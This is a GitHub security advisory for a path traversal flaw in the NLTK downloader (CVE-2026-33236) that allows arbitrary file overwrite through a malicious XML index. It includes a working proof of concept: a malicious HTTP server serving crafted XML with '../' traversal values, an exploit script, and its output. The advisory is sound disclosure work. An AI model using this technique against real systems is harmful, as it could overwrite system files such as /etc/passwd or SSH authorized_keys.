# [H] NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite

## Summary
Severity: High
Advisory: GHSA-469j-vmhf-r6v7
CVE: CVE-2026-33236
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-469j-vmhf-r6v7
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0

## Details
## Vulnerability Description

The NLTK downloader does not validate the `subdir` and `id` attributes when processing remote XML index files. Attackers can control a remote XML index server to provide malicious values containing path traversal sequences (such as `../`), which can lead to:

1. **Arbitrary Directory Creation**: Create directories at arbitrary locations in the file system
2. **Arbitrary File Creation**: Create arbitrary files
3. **Arbitrary File Overwrite**: Overwrite critical system files (such as `/etc/passwd`, `~/.ssh/authorized_keys`, etc.)

## Vulnerability Principle

### Key Code Locations

**1. XML Parsing Without Validation** (`nltk/downloader.py:253`)
```python
self.filename = os.path.join(subdir, id + ext)
```
- `subdir` and `id` are directly from XML attributes without any validation

**2. Path Construction Without Checks** (`nltk/downloader.py:679`)
```python
filepath = os.path.join(download_dir, info.filename)
```
- Directly uses `filename` which may contain path traversal

**3. Unrestricted Directory Creation** (`nltk/downloader.py:687`)
```python
os.makedirs(os.path.join(download_dir, info.subdir), exist_ok=True)
```
- Can create arbitrary directories outside the download directory

**4. File Writing Without Protection** (`nltk/downloader.py:695`)
```python
with open(filepath, "wb") as outfile:
```
- Can write to arbitrary locations in the file system

### Attack Chain

```
1. Attacker controls remote XML index server
   ↓
2. Provides malicious XML: <package id="passwd" subdir="../../etc" .../>
   ↓
3. Victim executes: downloader.download('passwd')
   ↓
4. Package.fromxml() creates object, filename = "../../etc/passwd.zip"
   ↓
5. _download_package() constructs path: download_dir + "../../etc/passwd.zip"
   ↓
6. os.makedirs() creates directory: download_dir + "../../etc"
   ↓
7. open(filepath, "wb") writes file to /etc/passwd.zip
   ↓
8. System file is overwritten!
```

## Impact Scope
1. **System File Overwrite**

## Reproduction Steps

### Environment Setup

1. Install NLTK
```bash
pip install nltk
```

2. Prepare malicious server and exploit script (see PoC section)

### Reproduction Process

**Step 1: Start malicious server**
```bash
python3 malicious_server.py
```

**Step 2: Run exploit script**
```bash
python3 exploit_vulnerability.py
```

**Step 3: Verify results**
```bash
ls -la /tmp/test_file.zip
```

## Proof of Concept

### Malicious Server (malicious_server.py)

```python
#!/usr/bin/env python3
"""Malicious HTTP Server - Provides XML index with path traversal"""
import os
import tempfile
import zipfile
from http.server import HTTPServer, BaseHTTPRequestHandler

# Create temporary directory
server_dir = tempfile.mkdtemp(prefix="nltk_malicious_")

# Create malicious XML (contains path traversal)
malicious_xml = """<?xml version="1.0"?>
<nltk_data>
  <packages>
    <package id="test_file" subdir="../../../../../../../../../tmp" 
             url="http://127.0.0.1:8888/test.zip" 
             size="100" unzipped_size="100" unzip="0"/>
  </packages>
</nltk_data>
"""

# Save files
with open(os.path.join(server_dir, "malicious_index.xml"), "w") as f:
    f.write(malicious_xml)

with zipfile.ZipFile(os.path.join(server_dir, "test.zip"), "w") as zf:
    zf.writestr("test.txt", "Path traversal attack!")

# HTTP Handler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/malicious_index.xml':
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            with open(os.path.join(server_dir, 'malicious_index.xml'), 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/test.zip':
            self.send_response(200)
            self.send_header('Content-type', 'application/zip')
            self.end_headers()
            with open(os.path.join(server_dir, 'test.zip'), 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

# Start server
if __name__ == "__main__":
    port = 8888
    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"Malicious server started: http://127.0.0.1:{port}/malicious_index.xml")
    print("Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
```

### Exploit Script (exploit_vulnerability.py)

```python
#!/usr/bin/env python3
"""AFO Vulnerability Exploit Script"""
import os
import tempfile

def exploit(server_url="http://127.0.0.1:8888/malicious_index.xml"):
    download_dir = tempfile.mkdtemp(prefix="nltk_exploit_")
    print(f"Download directory: {download_dir}")
    
    # Exploit vulnerability
    from nltk.downloader import Downloader
    downloader = Downloader(server_index_url=server_url, download_dir=download_dir)
    downloader.download("test_file", quiet=True)
    
    # Check results
    expected_path = "/tmp/test_file.zip"
    if os.path.exists(expected_path):
        print(f"\n✗ Exploit successful! File written to: {expected_path}")
        print(f"✗ Path traversal attack successful!")
    else:
        print(f"\n? File not found, download may have failed")

if __name__ == "__main__":
    exploit()
```

### Execution Results

```
✗ Exploit successful! File written to: /tmp/test_file.zip
✗ Path traversal attack successful!
```

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7
- https://nvd.nist.gov/vuln/detail/CVE-2026-33236
- https://github.com/nltk/nltk/commit/89fe2ec2c6bae6e2e7a46dad65cc34231976ed8a
- https://github.com/nltk/nltk
